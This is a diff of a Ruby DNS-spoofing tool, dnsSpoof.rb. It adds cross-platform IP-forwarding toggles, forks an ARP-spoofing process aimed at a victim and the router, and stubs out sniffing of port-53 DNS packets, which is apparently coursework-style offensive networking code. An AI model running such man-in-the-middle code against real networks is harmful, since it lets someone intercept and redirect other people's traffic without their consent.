@@ -1,12 +1,7 @@
-# Module to determine OS type
-module OsType
-    def is_mac?
-        RUBY_PLATFORM.downcase.include?("darwin")
-    end
-    def is_linux?
-        RUBY_PLATFORM.downcase.include?("linux")
-    end
-end
+=begin
+ File: dnsSpoof.rb
+ Author: Luke Queenan
+=end
 
 # Gems
 require 'rubygems'
@@ -44,28 +39,69 @@ class DnsSpoof
         @ourInfo = Utils.whoami?(:iface => interface)
         
         # Enable IP forwarding based on the OS (Linux or OS X)
-        # TODO: Add check for OS
-        `sysctl -w net.inet.ip.forwarding=1`
+        DnsSpoof.forward(true);
     end
     
     def main
         
         # Create the ARP Spoofing process
         @pid = fork do
-            # Ensure that we shut down cleanly
-            Signal.trap("INT") { `sysctl -w net.inet.ip.forwarding=0`; exit }
+            # Ensure that we shut down the child cleanly
+            Signal.trap("INT") { DnsSpoof.forward(false); exit }
             arp = ArpSpoof.new(@routerIP, @routerMAC, @victimIP, @victimMAC,
                                @interface, @ourInfo)
             arp.main
         end
         
-        sleep 5
-        Process.kill("INT", @pid)
+        # Make sure we shut down cleanly
+        Signal.trap("SIGINT") { Process.kill("INT", @pid); Process.wait; exit }
+        
+        # Start DNS portion of program
+        #sniffPackets
         Process.wait
+        
+    end
+
+private    
+    
+    def sniffPackets
+        
+        # Start the capture process
+        capture = Capture.new(:iface => @interface, :start => true,
+                                        :promisc => true,
+                                        :filter => "udp and port 53",
+                                        :save => true)
+        
+        # Find the DNS packets
+        capture.stream.each do |pkt|
+            packet = Packet.parse(pkt)
+        end
         
         
     end
     
+    
+    # Function for enabling packet forwarding based on OS type
+    def DnsSpoof.forward(forward)
+        
+        if RUBY_PLATFORM =~ /darwin/
+            if forward then
+                `sysctl -w net.inet.ip.forwarding=1`
+            end
+            
+            if !forward then
+                `sysctl -w net.inet.ip.forwarding=0`
+            end
+        else
+            if forward then
+                `echo 1 > /proc/sys/net/ipv4/ip_forward`
+            end
+            
+            if !forward then
+                `echo 0 > /proc/sys/net/ipv4/ip_forward`
+            end
+        end
+    end
 end
 
 spoof = DnsSpoof.new(ARGV[0], ARGV[1], ARGV[2])
